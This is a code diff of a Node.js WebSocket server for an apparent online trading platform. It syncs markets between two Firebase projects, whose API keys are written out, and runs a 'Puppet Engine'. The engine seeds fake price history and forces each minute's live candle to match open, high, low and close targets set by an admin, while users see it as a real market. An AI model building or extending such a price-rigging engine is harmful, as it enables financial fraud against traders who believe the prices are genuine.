@@ -9,7 +9,7 @@ require('firebase/database');
 // 1. DUAL FIREBASE CONFIGURATION
 // ==========================================
 
-// MAIN DATABASE (For Users, Balances, Trade History - Old Firebase)
+// MAIN DATABASE (ictex-trade: For Users, Balances, Trade History, and Adding Markets)
 const mainConfig = {
     apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
     authDomain: "ictex-trade.firebaseapp.com",
@@ -20,7 +20,7 @@ const mainConfig = {
     appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
 };
 
-// MARKET DATABASE (For Live Candles, Admin Target Control - New Firebase)
+// MARKET DATABASE (earning-xone-v1: For Live Candles & Admin Puppet Control)
 const marketConfig = {
     apiKey: "AIzaSyBspVTNDTLn2zuwwI7580vqHABrAjJl63o",
     authDomain: "earning-xone-v1.firebaseapp.com",
@@ -35,8 +35,8 @@ const marketConfig = {
 const mainApp = firebase.initializeApp(mainConfig, "MainApp");
 const marketApp = firebase.initializeApp(marketConfig, "MarketApp");
 
-const dbMain = mainApp.database();       // For User Data
-const dbMarket = marketApp.database();   // For Market & Candles
+const dbMain = mainApp.database();       // Read markets from here
+const dbMarket = marketApp.database();   // Write live prices and read targets from here
 
 // ==========================================
 // 2. SERVER SETUP & VARIABLES
@@ -46,36 +46,47 @@ app.use(cors());
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-const MAX_CANDLES = 1500; // Limit memory to 1500 candles per market
-const TIMEFRAME = 60000;  // 1 Minute candle
-const TICK_MS = 300;      // Tick animation speed
+const MAX_CANDLES = 1500; // Keep only 1500 candles in RAM per market
+const TIMEFRAME = 60000;  // 1 Minute timeframe
+const TICK_MS = 300;      // Price update speed (animation)
 const MIN_PRICE = 0.00001;
-const HISTORY_SEED_COUNT = 300;
+const HISTORY_SEED_COUNT = 300; // Seed fake history for empty markets
 
-const markets = {};       // Internal Memory Storage (Saves Firebase Storage)
-const marketTargets = {}; // Admin's Target Instructions
+const markets = {};       // Memory storage for charts
+const marketTargets = {}; // Admin's OHLC Targets
 
 function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
 
 // ==========================================
-// 3. ADMIN PUPPET LISTENER (From Market DB)
+// 3. ADMIN PUPPET LISTENER & MARKET SYNC
 // ==========================================
-// Listen for exact OHLC targets set by admin
+
+// Listen for exact OHLC targets set by admin (From New Market DB)
 dbMarket.ref('admin/market_targets').on('value', (snapshot) => {
     const targets = snapshot.val() || {};
-    // Clear old targets and set new ones
+    // Clear old targets
     for (let key in marketTargets) delete marketTargets[key];
+    // Set new targets
     Object.keys(targets).forEach(marketId => {
         marketTargets[marketId] = targets[marketId];
     });
 });
 
-// Listen to Market List initialization
-dbMarket.ref('admin/markets').on('value', (snapshot) => {
+// 🔥 THE BRIDGE: Auto Sync Markets from MAIN DB to MARKET DB 🔥
+dbMain.ref('admin/markets').on('value', (snapshot) => {
     const fbMarkets = snapshot.val() || {};
+    
+    // 1. Auto-copy all markets to the new Firebase instantly!
+    dbMarket.ref('admin/markets').set(fbMarkets).catch(err => console.error("Sync Error:", err));
+
+    // 2. Initialize these markets in Render's Engine
     Object.keys(fbMarkets).forEach((marketId) => {
-        if (!markets[marketId]) {
+        const marketData = fbMarkets[marketId];
+        // Start engine only for OTC/Broker active markets
+        if ((marketData.type === 'otc' || marketData.type === 'broker_real') && 
+            (marketData.status === 'active' || marketData.status === 'maintenance') && 
+            !markets[marketId]) {
             initializeNewMarket(marketId);
         }
     });
@@ -85,12 +96,11 @@ dbMarket.ref('admin/markets').on('value', (snapshot) => {
 // 4. CANDLE GENERATOR & PUPPET ENGINE
 // ==========================================
 
-// Seed history for new markets
 async function initializeNewMarket(marketId) {
     const path = marketPathFromId(marketId);
-    let startPrice = 1.15; // Default price
+    let startPrice = 1.15; 
     
-    // Try to get last price from Market DB
+    // Try to fetch the last known price to resume
     try {
         const liveSnap = await dbMarket.ref(`markets/${path}/live`).once('value');
         if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
@@ -100,7 +110,6 @@ async function initializeNewMarket(marketId) {
     const candles = [];
     let currentPrice = startPrice;
 
-    // Generate fake history to fill chart
     for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
         const isGreen = Math.random() > 0.5;
         const body = currentPrice * 0.0002;
@@ -122,12 +131,12 @@ async function initializeNewMarket(marketId) {
         currentPrice: currentPrice,
         lastMove: 0
     };
-    console.log(`[MARKET INIT] ${marketId} seeded with ${HISTORY_SEED_COUNT} candles.`);
+    console.log(`[ENGINE] Started for ${marketId}.`);
 }
 
 // Normal Realistic Tick (When no admin command)
 function updateRealisticPrice(marketData, currentCandle) {
-    if (Math.random() < 0.35) return; // Add pauses for realism
+    if (Math.random() < 0.35) return; 
     
     const openPrice = currentCandle.open;
     const baseVolatility = openPrice * 0.00005;
@@ -140,49 +149,45 @@ function updateRealisticPrice(marketData, currentCandle) {
     currentCandle.low = roundPrice(Math.min(currentCandle.low, currentCandle.close));
 }
 
-// 🔥 PUPPET ENGINE: Forces price to perfectly match Admin's Target
+// PUPPET ENGINE: Forces price to perfectly match Admin's Target
 function updatePuppetPrice(marketData, currentPeriodStart, currentCandle) {
     const target = marketTargets[marketData.marketId];
     
-    // If no target from admin, act like a normal market
+    // If no admin command, run normal market logic
     if (!target) {
         updateRealisticPrice(marketData, currentCandle);
         return;
     }
 
     const now = Date.now();
-    const timeElapsed = now - currentPeriodStart; // 0 to 60000
-    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0); // 0.0 to 1.0
+    const timeElapsed = now - currentPeriodStart; 
+    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0); 
 
     let currentLivePrice;
 
-    // Animation Logic (Matching 1 Minute Timeframe)
     if (progress < 0.3) {
-        // 0-18s: Move from Open towards the targeted High or Low range
+        // Move towards target High/Low
         const distance = target.target_high - target.target_open;
         currentLivePrice = target.target_open + (distance * (progress / 0.3));
     } 
     else if (progress < 0.8) {
-        // 18s-48s: Fluctuate normally inside the High/Low boundary
+        // Fluctuate between High and Low
         const range = target.target_high - target.target_low;
         currentLivePrice = target.target_low + (Math.random() * range);
     } 
     else {
-        // 48s-60s: Magnetically pull the price exactly to target_close
-        const remainingProgress = (progress - 0.8) / 0.2; // 0.0 to 1.0
+        // Forcefully match the Target Close at the end of the minute
+        const remainingProgress = (progress - 0.8) / 0.2; 
         const distanceToClose = target.target_close - marketData.currentPrice;
         currentLivePrice = marketData.currentPrice + (distanceToClose * remainingProgress);
     }
 
-    // Apply Live Price
     marketData.currentPrice = currentLivePrice;
     currentCandle.close = roundPrice(currentLivePrice);
-    
-    // Strict boundaries
     currentCandle.high = roundPrice(Math.max(currentCandle.high, currentLivePrice));
     currentCandle.low = roundPrice(Math.min(currentCandle.low, currentLivePrice));
 
-    // Force perfect match at the very last second
+    // Perfect Match at 98% time
     if (progress >= 0.98) {
         currentCandle.close = target.target_close;
         currentCandle.high = target.target_high;
@@ -204,23 +209,20 @@ setInterval(() => {
         const marketData = markets[marketId];
         let lastCandle = marketData.history[marketData.history.length - 1];
 
-        // 1. Detect New Minute (Candle Creation)
+        // 1. Detect New Minute
         if (!lastCandle || currentPeriodStart > lastCandle.timestamp) {
             
-            // 🔥 REMOVE ADMIN TARGET FROM FIREBASE (Limit Saver!)
-            // After finishing a target candle, we delete the command.
+            // Delete target from Firebase so it doesn't repeat!
             if (marketTargets[marketId]) {
                 dbMarket.ref(`admin/market_targets/${marketId}`).remove();
                 delete marketTargets[marketId];
-                console.log(`[PUPPET COMPLETED] Target for ${marketId} achieved and cleared.`);
+                console.log(`[PUPPET COMPLETED] ${marketId} matched target.`);
             }
 
-            // Shift history (Delete oldest to maintain 1500 limit memory)
             if (marketData.history.length >= MAX_CANDLES) {
                 marketData.history.shift(); 
             }
 
-            // Create Blank Candle for New Minute
             const openPrice = lastCandle ? lastCandle.close : 1.15;
             lastCandle = {
                 timestamp: currentPeriodStart,
@@ -232,10 +234,10 @@ setInterval(() => {
             marketData.history.push(lastCandle);
         }
 
-        // 2. Move Price (Animate)
+        // 2. Animate Price
         updatePuppetPrice(marketData, currentPeriodStart, lastCandle);
 
-        // 3. Broadcast to Live Users via WebSocket (0 Firebase Limits)
+        // 3. Broadcast to Live Users via WebSocket
         const payload = JSON.stringify({ market: marketId, candle: lastCandle, serverTime: now });
         wss.clients.forEach((client) => {
             if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
@@ -244,8 +246,7 @@ setInterval(() => {
         });
     }
 
-    // 4. Save ONLY the Live Price to Firebase Market DB (Every 2 Seconds)
-    // This allows new users to load the current price fast.
+    // 4. Save Live Price to New Market DB
     if (currentSecond % 2 === 0 && currentSecond !== lastSyncSecond) {
         lastSyncSecond = currentSecond;
         const batchUpdates = {};
@@ -259,18 +260,15 @@ setInterval(() => {
                 };
             }
         }
-        // Write to New Market DB (Will never run out of quota)
         dbMarket.ref().update(batchUpdates).catch(()=>{});
     }
 
 }, TICK_MS);
 
-
 // ==========================================
 // 6. API & WEBSOCKET CONNECTIONS
 // ==========================================
 
-// Handle WebSocket Subscriptions
 wss.on('connection', (ws) => {
     ws.on('message', (raw) => {
         try {
@@ -282,7 +280,6 @@ wss.on('connection', (ws) => {
     });
 });
 
-// REST API for Users to Load 1500 History Candles
 app.get('/api/history/:marketId', (req, res) => {
     const marketId = req.params.marketId;
     if (markets[marketId] && markets[marketId].history) {
@@ -292,8 +289,7 @@ app.get('/api/history/:marketId', (req, res) => {
     }
 });
 
-// Cron-job ping endpoint
-app.get('/ping', (_req, res) => res.send('Puppet Engine v1.0 - Dual DB Active'));
+app.get('/ping', (_req, res) => res.send('Dual DB Puppet Engine Active'));
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`🚀 Puppet Engine Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
